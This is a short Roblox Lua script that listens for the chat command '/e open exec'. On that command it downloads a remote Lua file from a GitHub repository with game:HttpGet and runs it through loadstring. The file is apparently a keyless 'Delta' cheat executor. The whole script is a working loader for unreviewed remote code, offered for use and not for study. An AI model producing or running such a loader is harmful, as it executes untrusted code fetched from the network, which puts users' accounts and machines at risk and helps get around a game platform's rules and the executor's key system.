function wsexec(dm)
runcode(dm)
end
wsexec([[print("OK")]])
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg:match("/e open exec") then
        wsexec([[loadstring(game:HttpGet("https://raw.githubusercontent.com/weishanteam/New-delta/main/%E7%94%A8%E6%88%B7%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2/deltanokey.lua"))()]])
        return true
    end
end)
